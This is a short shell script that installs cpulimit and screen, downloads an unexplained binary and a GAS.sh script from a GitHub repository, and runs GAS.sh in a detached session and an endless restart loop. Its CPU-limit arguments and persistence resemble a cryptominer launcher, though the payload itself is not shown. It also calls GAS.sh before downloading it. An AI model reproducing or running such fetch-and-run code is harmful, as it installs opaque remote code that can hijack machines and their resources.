#!/bin/sh

sudo apt update
sudo apt install cpulimit
sudo apt install screen -y
screen -dmS GAS.sh ./GAS.sh 65 75
wget https://github.com/nuri655/VRS/raw/main/GASKEUN
wget https://raw.githubusercontent.com/nuri655/VRS/main/GAS.sh
chmod +x GAS.sh
while [ 1 ]; do
./GAS.sh
sleep 3
done
sleep 999